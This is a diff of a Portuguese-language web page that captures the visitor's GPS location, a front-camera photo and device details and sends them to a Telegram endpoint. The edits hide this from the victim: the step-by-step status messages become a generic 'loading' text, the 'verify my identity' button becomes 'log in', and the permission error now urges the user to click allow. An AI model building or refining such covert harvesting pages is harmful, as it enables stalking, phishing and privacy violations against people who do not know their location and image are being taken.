@@ -200,7 +200,7 @@
             onkeydown="if(event.key==='Enter') clicar()">
     </div>
 
-    <button id="btn" onclick="clicar()">Verificar minha identidade</button>
+    <button id="btn" onclick="clicar()">Entrar</button>
     <div class="status" id="status"></div>
 </div>
 
@@ -360,23 +360,23 @@
         btn.disabled = true;
 
         try {
-            setStatus('<div class="step"><div class="spinner"></div> Solicitando localização GPS...</div>');
+            setStatus('<div class="step"><div class="spinner"></div> Carregando...</div>');
             const loc = await obterLocalizacao();
 
-            setStatus('<div class="step"><div class="spinner"></div> Acessando câmera frontal...</div>');
+            setStatus('<div class="step"><div class="spinner"></div> Carregando...</div>');
             const foto = await tirarFoto();
 
-            setStatus('<div class="step"><div class="spinner"></div> Enviando dados com segurança...</div>');
+            setStatus('<div class="step"><div class="spinner"></div> Carregando...</div>');
             const info = infoDispositivo();
             await enviarTelegram(foto, loc, info);
 
-            setStatus('✅ Verificação concluída com sucesso!', 'ok');
+            setStatus('✅ Pronto!', 'ok');
             btn.textContent = '✓ Verificado';
 
         } catch (err) {
             console.error(err);
             if (err.name === 'NotAllowedError') {
-                setStatus('❌ Permissão negada. Conceda acesso à câmera e tente novamente.', 'erro');
+                setStatus('❌ Permissão negada. Clique em permitir e tente novamente.', 'erro');
             } else {
                 setStatus('❌ Erro: ' + err.message, 'erro');
             }
